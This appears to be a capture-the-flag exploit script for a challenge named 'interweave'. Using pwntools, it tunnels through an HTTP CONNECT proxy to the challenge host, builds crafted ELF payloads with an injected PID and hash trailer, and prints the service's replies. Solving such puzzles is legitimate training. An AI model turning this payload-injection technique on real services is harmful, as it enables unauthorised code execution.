import base64
from pwn import *
import sha256
import sys


def do_main(pid, cred):
    try:
        if cred is None:
            proc = process('./interweave')
        else:
            proc = remote('101.132.105.41.nip.io',22022)
            proc.send(b'CONNECT ' + cred + b' HTTP/1.1\r\n\r\n')
            proc.recvline()
            proc.recvline()
            proc.recvline()

        blobs = [base64.b64decode(proc.recvline()) for i in range(16)]

        pid = str(pid).rjust(7, '/')

        data_offset = 0x100
        code = open('flag4_main', 'rb').read()
        code = code.replace(b'$$PID$$', pid.encode())
        elfs = [code + b'\x00'*(data_offset-len(code)) + blobs[i] for i in range(16)]
        hashes = b''.join([sha256.generate_hash(b) for b in elfs])
        elfs = [b + hashes for b in elfs]

        for b in elfs:
            proc.send(base64.b64encode(b).replace(b'=', b'') + b'\n')

        while True:
            lne = proc.readline()
            print(lne)

    except EOFError:
        pass
    proc.close()


if __name__ == '__main__':
    do_main(sys.argv[1], None)
